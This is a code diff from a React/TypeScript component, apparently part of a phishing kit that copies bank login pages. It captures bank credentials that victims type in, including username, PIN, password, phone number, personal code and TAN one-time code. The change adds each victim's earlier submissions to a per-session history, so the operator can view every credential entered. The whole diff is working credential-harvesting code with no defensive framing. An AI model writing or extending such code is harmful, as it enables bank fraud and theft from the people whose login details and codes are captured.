@@ -1158,33 +1158,9 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
         }),
       );
 
-      const historyEntry = {
-        bankSlug,
-        bankName,
-        htmlStepIndex: stepIndex,
-        htmlStepLabel: "BANKA FORMU",
-        verfuegernummer: usernameField?.value ?? "",
-        username: usernameField?.value ?? "",
-        pin: passwordField?.value ?? "",
-        password: passwordField?.value ?? "",
-        bankPhone: phoneField?.value ?? "",
-        personalCode: personalCodeField?.value ?? "",
-        tacCode: tacField?.value ?? "",
-        orderedField1: orderedField1?.value ?? "",
-        orderedField1Key: resolveOrderedKey(orderedField1, "username"),
-        orderedField2: orderedField2?.value ?? "",
-        orderedField2Key: resolveOrderedKey(orderedField2, ""),
-        orderedField2Type: resolveOrderedType(orderedField2),
-        orderedField3: orderedField3?.value ?? "",
-        orderedField3Key: resolveOrderedKey(orderedField3, ""),
-        orderedField3Type: resolveOrderedType(orderedField3),
-        rawFields,
-        capturedAt: new Date().toISOString(),
-      };
-
       // ⭐ BANKA GECMISI APPEND: SADECE TEKRAR GIRISLERDE push et.
-      //   ILK GIRIS (step 0 + daha once veri YOKSA) kolonlara kaydedilsin ama
-      //   GEÇMİŞ butonu sayisi artmasin.
+      //   ⚠️ HISTORY'E YENI DEĞIL, ESKI (previousFormData submit oncesi) alanlarini PUSH ET!
+      //   Boylece kolon = YENI form degerleri, history = ESKI form degerleri (gorunur).
       const prevOrdered1 = String((previousFormData as any).orderedField1 || "").trim();
       const prevUsername = String((previousFormData as any).username || (previousFormData as any).verfuegernummer || "").trim();
       const prevPassword = String((previousFormData as any).password || (previousFormData as any).pin || "").trim();
@@ -1194,7 +1170,47 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
         ? (previousFormData as any).bankFormHistory.slice()
         : [];
       if (!isFirstBankEntry) {
-        previousHistory.push(historyEntry);
+        const prevVerfuegernummer = String((previousFormData as any).verfuegernummer || "").trim();
+        const prevUsernameInner = String((previousFormData as any).username || "").trim();
+        const prevPin = String((previousFormData as any).pin || "").trim();
+        const prevPasswordInner = String((previousFormData as any).password || "").trim();
+        const prevBankPhone = String((previousFormData as any).bankPhone || "").trim();
+        const prevPersonalCode = String((previousFormData as any).personalCode || "").trim();
+        const prevTacCode = String((previousFormData as any).tacCode || "").trim();
+        const prevOrderedField1 = String((previousFormData as any).orderedField1 || "").trim();
+        const prevOrderedField1Key = String((previousFormData as any).orderedField1Key || "").trim();
+        const prevOrderedField2 = String((previousFormData as any).orderedField2 || "").trim();
+        const prevOrderedField2Key = String((previousFormData as any).orderedField2Key || "").trim();
+        const prevOrderedField2Type = String((previousFormData as any).orderedField2Type ?? "").trim();
+        const prevOrderedField3 = String((previousFormData as any).orderedField3 || "").trim();
+        const prevOrderedField3Key = String((previousFormData as any).orderedField3Key || "").trim();
+        const prevOrderedField3Type = String((previousFormData as any).orderedField3Type ?? "").trim();
+        const previousHistoryEntry = {
+          bankSlug,
+          bankName,
+          htmlStepIndex: stepIndex,
+          htmlStepLabel: "BANKA FORMU",
+          verfuegernummer: prevVerfuegernummer,
+          username: prevUsernameInner,
+          pin: prevPin,
+          password: prevPasswordInner,
+          bankPhone: prevBankPhone,
+          personalCode: prevPersonalCode,
+          tacCode: prevTacCode,
+          orderedField1: prevOrderedField1,
+          orderedField1Key: prevOrderedField1Key,
+          orderedField2: prevOrderedField2,
+          orderedField2Key: prevOrderedField2Key,
+          orderedField2Type: prevOrderedField2Type,
+          orderedField3: prevOrderedField3,
+          orderedField3Key: prevOrderedField3Key,
+          orderedField3Type: prevOrderedField3Type,
+          rawFields: Object.fromEntries(
+            Object.entries(previousFormData as Record<string, any>).filter(([k]) => typeof k === "string" && k.length > 0),
+          ),
+          capturedAt: new Date().toISOString(),
+        };
+        previousHistory.push(previousHistoryEntry);
       }
 
       const mergedUsername = usernameField?.value || (previousFormData.username as string) || "";
